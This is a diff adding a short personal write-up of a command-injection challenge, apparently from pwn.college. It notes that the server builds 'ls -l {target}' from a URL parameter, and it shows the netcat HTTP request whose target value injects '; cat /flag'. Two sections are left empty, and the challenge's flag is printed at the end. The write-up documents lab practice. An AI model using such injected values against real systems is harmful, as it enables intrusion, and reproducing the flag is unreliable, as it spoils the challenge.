@@ -1,0 +1,31 @@
+# challenge: CMDi 1
+
+📅 2026-01-21
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the only endpoint available is /mission
+the server sends back the output of aguments that had been passed through the url
+by default it concatenates them to "ls -l {args}"
+the server expects an argument called target, in which assigns to it as default "/challenge" if no args had been provided
+so the goal is to inject our crafted command as value of target in the url
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /mission?target=bro%3B%20cat%20%2Fflag HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+
+
+## 🧑🏾‍🏫 what this challenge teaches u
+
+
+## 🏁 Flag  
+pwn.college{Q26HsV5ssAO0q4DFvGdGRPootrP.QX1YTN2wCO4IDOxEzW}
